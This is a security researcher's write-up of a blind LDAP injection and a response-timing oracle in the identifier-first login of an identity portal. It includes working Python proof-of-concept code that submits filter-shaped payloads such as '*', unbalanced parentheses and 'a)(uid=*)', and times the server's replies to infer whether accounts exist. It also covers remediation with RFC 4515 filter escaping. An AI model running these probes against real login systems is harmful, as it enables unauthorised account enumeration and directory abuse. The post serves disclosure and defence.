---
title: Blind LDAP Injection in an Identifier-Login
date: '2026-09-26'
category: 0day
description: ''
tags: []
draft: false
---

# How I Found a Blind LDAP Injection in an Identifier-First Login

The first screen of an identity portal asked for an email address before it asked for a password. That made the identifier field an interesting boundary: the application had to look up the account before it could decide which sign-in path to show. I found that special characters in this pre-login field changed the server’s behavior, and repeated requests exposed a timing difference between identifiers that appeared to match directory entries and identifiers that did not.

This article uses `id.example.com` as the example host. The field name, request flow, and tests reflect my proof of concept; the example hostname does not identify the affected service.

## The entry point

The portal used an identifier-first flow. A GET of the sign-in page returned a form with a session-specific action URL and hidden fields. The visible email box was submitted as `subject`. Each new attempt needed a fresh GET so that the subsequent POST used the current form action and accompanying fields.

There was no password or authenticated session at this point. My first question was whether `subject` was treated as a literal email address or placed into a directory search. I compared ordinary values with characters that have meaning in LDAP filter syntax:

~~~text
zz(test)ldap     balanced parentheses
zz(testldap      unmatched opening parenthesis
zztest)ldap      unmatched closing parenthesis
*                wildcard
~~~

A malformed, filter-shaped `subject` produced a `server_error` response in the demonstration, while the ordinary request continued through the login flow. A bare `*` also behaved differently from a random identifier. These observations pointed to a directory-filter parsing problem, but an error page alone cannot reveal the exact server-side expression. The proof of concept also tests `**`; I would not treat that value as universal proof of invalid LDAP syntax because parsers can differ and RFC 4515 permits multiple substring wildcards. The stronger evidence is the controlled change in behavior when parentheses disturb the lookup, combined with the repeatable timing signal.

## Capturing the actual request flow

The following condensed Python code preserves the useful part of my PoC. It collects the current form action and hidden values, changes only `subject`, and times only the POST. The hostname is an example; the code does not contain credentials.

~~~python
import re
import time
from urllib.parse import urljoin

import requests

BASE = "https://id.example.com/"

def probe(subject):
    with requests.Session() as session:
        page = session.get(BASE, timeout=30)
        page.raise_for_status()

        form = re.search(
            r'<form[^>]*action="([^"]+)"[^>]*>(.*?)</form>',
            page.text,
            re.S | re.I,
        )
        if form is None:
            raise RuntimeError("Login form was not found")

        action, body = form.groups()
        fields = {
            name: value or ""
            for name, value in re.findall(
                r'name="([^"]+)"[^>]*?(?:value="([^"]*)")?',
                body,
            )
        }
        fields["subject"] = subject

        started = time.perf_counter()
        response = session.post(
            urljoin(page.url, action),
            data=fields,
            timeout=70,
        )
        elapsed = time.perf_counter() - started

        server_error = (
            'name="error"' in response.text
            and "server_error" in response.text
        )
        return elapsed, server_error

for value in ("zz(test)ldap", "zz(testldap", "zztest)ldap", "*"):
    elapsed, error = probe(value)
    print(f"{value!r}: {elapsed:.2f}s, server_error={error}")
~~~

The HTML extraction matches the form shape in the PoC. In another application, a DOM parser would be more robust than a regular expression. What matters for the evidence is preserving the one-time form URL and hidden values while varying one input.

## The timing oracle

The visible page could look the same for a matching and a nonmatching identifier. The POST duration carried the difference. The PoC notes report roughly `0.30–0.36 s` for wildcard prefixes that matched entries and around `0.52–0.61 s` for tested prefixes that matched none. An earlier series of 18 interleaved comparisons reported a statistical difference, but its samples still overlapped: one matching request took `0.97 s` while one nonmatching request took `0.42 s`. A single fast or slow response therefore cannot establish whether an account exists.

The script measures a new absent baseline on each run and uses medians from repeated samples. A compact, bounded version of that check looks like this:

~~~python
import random
import statistics
import time

def median_post_time(value, repetitions=5, pause=0.6):
    samples = []
    for _ in range(repetitions):
        elapsed, _ = probe(value)
        samples.append(elapsed)
        time.sleep(pause)
    return statistics.median(samples)

controls = [
    f"zz{random.randrange(10**8, 10**9)}@example.com"
    for _ in range(6)
]
absent_baseline = statistics.median(
    median_post_time(address, repetitions=1)
    for address in controls
)
candidate = median_post_time("alice@example.com")

print(f"absent baseline: {absent_baseline:.2f}s")
print(f"candidate:       {candidate:.2f}s")
print("difference:      %.0f%%" %
      (100 * (absent_baseline - candidate) / absent_baseline))
~~~

The output is an *inference*, not proof that `alice@example.com` exists. Network jitter, cache state, rate limits, upstream identity services, and load can move these distributions. The source tool marks close results uncertain and asks for more samples. Its prefix mode can test one character at a time with `prefix*` and pause between requests; when several next characters seem plausible, it stops instead of presenting a guessed identifier as a recovered account. The more expensive population strategy in the source is unnecessary to explain or verify the core finding.

## What may be happening inside the system

PingFederate’s identifier-first adapter captures the submitted identifier in a `subject` attribute. A deployment can then use an attribute from that authentication flow in a directory search filter. If an integration or lookup configuration inserts the raw `subject` value into an LDAP filter assertion, the input can change the meaning of that filter. This is the likely trust-boundary failure shown by the PoC; I did not have the server’s filter template or configuration, so its exact location remains unverified.

For example, the following is an **illustration of vulnerable construction**, not a recovered line of application code:

~~~python
subject = request.form["subject"]
search_filter = f"(&(objectClass=person)(mail={subject}))"
~~~

If `subject` is `*`, the `mail` assertion becomes a presence test rather than an exact lookup. Parentheses can alter or break the filter structure. Even when response bodies are uniform, different numbers of matches or a different lookup path can produce measurable response times. A malformed filter may also trigger an exception that the application exposes as a generic `server_error`.

This explanation assigns no vendor-level flaw to PingFederate. The failing point could be a custom adapter, an attribute-source mapping, or another component that takes `subject` into an LDAP query. Reviewing the effective filter and the escaping operation at the directory-call boundary would identify the precise component.

## Impact and limits of the proof

The evidence supports an unauthenticated, likely LDAP filter injection and a possible account-existence timing oracle. Under suitable network conditions, an attacker could test whether candidate identifiers match directory entries and possibly build prefixes of an identifier through repeated probes. Malformed or broad searches could also add directory load.

I did **not** demonstrate a password bypass, an authenticated session, directory attribute disclosure, or account takeover. The timing classifier’s thresholds are specific to the observed environment and should not be treated as a universal account oracle. Those limits matter when describing the issue publicly and when triaging it internally.

## Remediation

The primary fix belongs where the identifier becomes an LDAP search value. Encode it for an LDAP **search-filter assertion** under RFC 4515 before inserting it into a fixed filter structure. Escaping a distinguished name follows different rules and is not interchangeable. For a Python integration using `ldap3`, the safe pattern is:

~~~python
from ldap3 import SUBTREE
from ldap3.utils.conv import escape_filter_chars

def find_account(conn, submitted_identifier):
    identifier = submitted_identifier.strip()
    if not identifier or len(identifier) > 254:
        return None

    literal_value = escape_filter_chars(identifier)
    search_filter = (
        f"(&(objectClass=person)(mail={literal_value}))"
    )
    conn.search(
        search_base="ou=people,dc=example,dc=com",
        search_filter=search_filter,
        search_scope=SUBTREE,
        attributes=["mail"],
        size_limit=2,
        time_limit=3,
    )

    if len(conn.entries) != 1:
        return None
    return conn.entries[0]
~~~

Here `escape_filter_chars("*")` makes the asterisk a literal value in the assertion, so it cannot turn an exact `mail` lookup into `(mail=*)`. In a PingFederate deployment, review the directory attribute source and any custom adapter or lookup code that receives `subject`. Apply the platform’s supported filter-value escaping at that boundary rather than assuming the identifier-first UI performs it automatically.

Input validation should enforce the identifiers the application actually accepts, after consistent normalization. It complements filter escaping but does not replace it; email addresses can legitimately contain characters that simplistic blocklists reject. Keep the directory search base narrow, use a read-only directory account, and set server-side size and time limits. Return the same outward response for unknown accounts and lookup errors, and measure the full request path after the fix to ensure that account existence no longer creates a useful timing difference. Artificial delays alone are not a substitute for correcting the query.

Regression checks should cover ordinary addresses, literal asterisks, parentheses, backslashes, NUL bytes, long inputs, multiple-match results, and no-match results. An input such as `a)(uid=*)` must remain a literal search value or be rejected before lookup; it must never become LDAP syntax.

## Conclusion

The sign-in screen exposed a directory lookup before authentication. The PoC showed that filter-shaped input affected that lookup and that repeated measurements could distinguish some matching prefixes from nonmatching ones. The most plausible cause is unescaped `subject` data reaching an LDAP search filter, but the server-side configuration is needed to identify the exact faulty component. Escaping the assertion value at the lookup boundary, limiting the search, and removing outcome-dependent behavior address the injection and the information leak together.

### References

- [RFC 4515: LDAP search-filter string representation](https://www.rfc-editor.org/info/rfc4515/)
- [OWASP LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)
- [PingFederate Identifier First Adapter documentation](https://docs.pingidentity.com/pingfederate/13.0/administrators_reference_guide/pf_identifier_first_adapter.html)
- [ldap3 search and filter-escaping documentation](https://ldap3.readthedocs.io/en/latest/searches.html)
